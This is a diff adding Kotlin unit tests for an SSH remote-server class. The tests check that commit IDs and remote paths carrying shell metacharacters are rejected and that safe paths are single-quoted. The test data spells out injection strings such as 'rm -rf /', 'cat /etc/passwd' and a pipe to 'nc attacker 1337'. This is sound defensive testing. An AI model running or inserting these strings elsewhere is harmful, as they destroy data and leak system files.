@@ -568,4 +568,204 @@ class SshRemoteServerTest :
         "sync data end does nothing" {
             server.syncDataEnd(operation, null, true)
         }
+
+        // --- Security: command injection / unvalidated input -------------------
+
+        "get commit rejects malicious commitId with shell metacharacters" {
+            // Verify the executor is NEVER invoked for malicious commit IDs:
+            // validation must reject the input before it reaches any shell.
+            every { executor.exec(*anyVararg()) } returns ""
+            val malicious =
+                listOf(
+                    "id\"; rm -rf /; echo \"",
+                    "id; cat /etc/passwd",
+                    "id`whoami`",
+                    "id\$(id)",
+                    "id && echo pwned",
+                    "id | nc attacker 1337",
+                    "../../etc/passwd",
+                    "id\nrm -rf /",
+                    "",
+                )
+            for (commitId in malicious) {
+                shouldThrow<IllegalArgumentException> {
+                    server.getCommit(
+                        mapOf("username" to "user", "address" to "host", "password" to "password", "path" to "/path"),
+                        emptyMap(),
+                        commitId,
+                    )
+                }
+            }
+            verify(exactly = 0) { executor.exec(*anyVararg()) }
+        }
+
+        "get commit accepts well-formed commitIds" {
+            every { executor.exec(*anyVararg()) } returns "{}"
+            val valid = listOf("abc123", "commit.id", "commit_id", "commit-id", "ABC-123_v1.0")
+            for (commitId in valid) {
+                server.getCommit(
+                    mapOf("username" to "user", "address" to "host", "password" to "password", "path" to "/path"),
+                    emptyMap(),
+                    commitId,
+                ) shouldNotBe null
+            }
+        }
+
+        "list commits skips entries with malicious names rather than executing them" {
+            // ls returns one well-formed entry and one malicious entry. The
+            // malicious entry must be filtered out without ever reaching the
+            // `cat` shell command for that name.
+            every {
+                executor.exec(
+                    "sshpass",
+                    "-f",
+                    any(),
+                    "ssh",
+                    "-o",
+                    "StrictHostKeyChecking=no",
+                    "-o",
+                    "UserKnownHostsFile=/dev/null",
+                    "root@localhost",
+                    "ls",
+                    "-1",
+                    "/var/tmp",
+                )
+            } returns "good\nevil\"; rm -rf /; echo \"\n"
+            every {
+                executor.exec(
+                    "sshpass",
+                    "-f",
+                    any(),
+                    "ssh",
+                    "-o",
+                    "StrictHostKeyChecking=no",
+                    "-o",
+                    "UserKnownHostsFile=/dev/null",
+                    "root@localhost",
+                    "cat",
+                    "/var/tmp/good/metadata.json",
+                )
+            } returns "{}"
+            val result =
+                server.listCommits(
+                    mapOf("username" to "root", "password" to "password", "address" to "localhost", "path" to "/var/tmp"),
+                    emptyMap(),
+                    emptyList(),
+                )
+            result.size shouldBe 1
+            result[0].first shouldBe "good"
+            // Crucially: cat must NEVER be invoked with the malicious path.
+            verify(exactly = 0) {
+                executor.exec(
+                    *anyVararg(),
+                    "cat",
+                    "/var/tmp/evil\"; rm -rf /; echo \"/metadata.json",
+                )
+            }
+        }
+
+        "write file ssh rejects malicious path with shell metacharacters" {
+            // writeFileSsh interpolates `path` into `sh -c "cat > $path"`. A
+            // path containing shell metacharacters must be rejected before any
+            // process is started.
+            every { executor.start(*anyVararg()) } returns mockk()
+            val malicious =
+                listOf(
+                    "/tmp/foo\"; rm -rf /tmp/\"",
+                    "/tmp/foo;rm -rf /",
+                    "/tmp/foo`whoami`",
+                    "/tmp/foo\$(id)",
+                    "/tmp/foo && echo pwned",
+                    "/tmp/foo | nc attacker 1337",
+                    "/tmp/foo\nrm -rf /",
+                )
+            for (path in malicious) {
+                shouldThrow<IllegalArgumentException> {
+                    server.writeFileSsh(
+                        mapOf("username" to "user", "address" to "host", "password" to "password"),
+                        emptyMap(),
+                        path,
+                        "content",
+                    )
+                }
+            }
+            verify(exactly = 0) { executor.start(*anyVararg()) }
+        }
+
+        "write file ssh wraps safe paths in single quotes for sh -c" {
+            // Even allowlisted paths are single-quoted as defense-in-depth so
+            // any future relaxation of the allowlist still cannot break out of
+            // `sh -c "cat > '<path>'"`. Verify the literal command shape by
+            // capturing the args handed to the executor.
+            val argSlot = slot<Array<String>>()
+            every { executor.start(*varargAll { true }) } answers {
+                @Suppress("UNCHECKED_CAST")
+                argSlot.captured = invocation.args[0] as Array<String>
+                mockk {
+                    every { outputStream } returns ByteArrayOutputStream()
+                    every { isAlive } returns false
+                    every { waitFor(any(), any()) } returns true
+                }
+            }
+            every { executor.checkResult(any()) } just Runs
+
+            server.writeFileSsh(
+                mapOf("username" to "user", "address" to "host", "password" to "password"),
+                emptyMap(),
+                "/path/commit/metadata.json",
+                "content",
+            )
+
+            // Last arg passed to ssh is the `cat > '<path>'` shell payload.
+            argSlot.captured.last() shouldBe "cat > '/path/commit/metadata.json'"
+        }
+
+        "shellSingleQuote escapes embedded single quotes" {
+            // Unit test the helper directly so the escaping logic is covered
+            // even though the allowlist currently rejects paths containing '.
+            SshRemoteServer.shellSingleQuote("plain") shouldBe "plain"
+            SshRemoteServer.shellSingleQuote("it's") shouldBe "it'\\''s"
+            SshRemoteServer.shellSingleQuote("''") shouldBe "'\\'''\\''"
+        }
+
+        "validateCommitId rejects empty and bad input" {
+            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateCommitId("") }
+            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateCommitId("a b") }
+            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateCommitId("a/b") }
+            // Well-formed ids do not throw.
+            SshRemoteServer.validateCommitId("abc-1.0_v2")
+        }
+
+        "validateRemotePath rejects empty and bad input" {
+            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateRemotePath("") }
+            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateRemotePath("/tmp/foo bar") }
+            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateRemotePath("/tmp/foo;rm -rf /") }
+            // Well-formed paths do not throw.
+            SshRemoteServer.validateRemotePath("/var/tmp/commit/metadata.json")
+        }
+
+        "posix permissions exception is swallowed when not supported" {
+            // Exercises the UnsupportedOperationException catch on Windows-like
+            // file systems (line ~127). We mock Files.setPosixFilePermissions to
+            // throw so the branch executes on every platform.
+            mockkStatic(Files::class)
+            every { Files.setPosixFilePermissions(any(), any()) } throws UnsupportedOperationException("no posix")
+            val file =
+                kotlin.io.path
+                    .createTempFile()
+                    .toFile()
+            try {
+                // Must not propagate the exception.
+                val command =
+                    server.buildSshCommand(
+                        emptyMap(),
+                        mapOf("password" to "password"),
+                        file,
+                        false,
+                    )
+                command shouldNotBe null
+            } finally {
+                file.delete()
+            }
+        }
     })
